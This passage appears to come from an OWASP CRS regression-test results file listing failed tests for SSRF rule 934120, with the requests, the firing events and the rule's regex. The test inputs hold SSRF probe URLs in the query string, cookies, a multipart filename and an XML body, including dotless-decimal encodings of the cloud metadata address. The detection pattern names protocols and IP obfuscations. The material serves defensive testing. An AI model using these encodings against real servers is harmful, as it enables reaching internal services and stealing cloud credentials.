      "events" : [ "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "SSRF - Enclosed alphanumerics 1 - digits",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=acap://...",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)\" \"id:934120,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-ssrf',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-GENERIC',\\\n  tag:'capec/1000/225/664',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "934120",
    "test_id" : 24,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics 2 - digits",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "SSRF - Enclosed alphanumerics 2 - digits",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=imap://...",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)\" \"id:934120,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-ssrf',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-GENERIC',\\\n  tag:'capec/1000/225/664',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "934120",
    "test_id" : 25,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics 3 - text",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 25,
      "desc" : "SSRF - Enclosed alphanumerics 3 - text",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=irc://",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)\" \"id:934120,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-ssrf',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-GENERIC',\\\n  tag:'capec/1000/225/664',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "934120",
    "test_id" : 26,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics 3 - text",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 26,
      "desc" : "SSRF - Enclosed alphanumerics 3 - text",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=pop3://",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)\" \"id:934120,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-ssrf',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-GENERIC',\\\n  tag:'capec/1000/225/664',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "934120",
    "test_id" : 39,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics, dots",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=934110 - Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter", "phase=2 rule_id=934110 - Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter" ]
    },
    "test" : {
      "test_id" : 39,
      "desc" : "SSRF - Enclosed alphanumerics, dots",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://169254169254/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)\" \"id:934120,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-ssrf',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-GENERIC',\\\n  tag:'capec/1000/225/664',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "934120",
    "test_id" : 43,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Input variable coverage test (Dotless decimal)",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920451 - HTTP header is restricted by policy (host)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (user-agent)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-encoding)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-language)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (cookie)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-charset)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept)" ]
    },
    "test" : {
      "test_id" : 43,
      "desc" : "SSRF - Input variable coverage test (Dotless decimal)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Cookie" : "ssrf=http://2852039166/"
          },
          "method" : "GET",
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Cookie" : "http://2852039166/"
          },
          "method" : "GET",
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "POST",
          "uri" : "/post",
          "data" : "----------397236876\nContent-Disposition: form-data; name=\"file\"; filename=\"http://2852039166/?.txt\"\nContent-Type: text/plain\n\nMy epic SSRF attempt\n\n----------397236876--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?http://2852039166/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://2852039166/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "data" : "<?xml version=\"1.0\"?><xml><ssrf>http://2852039166/</ssrf></xml>",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
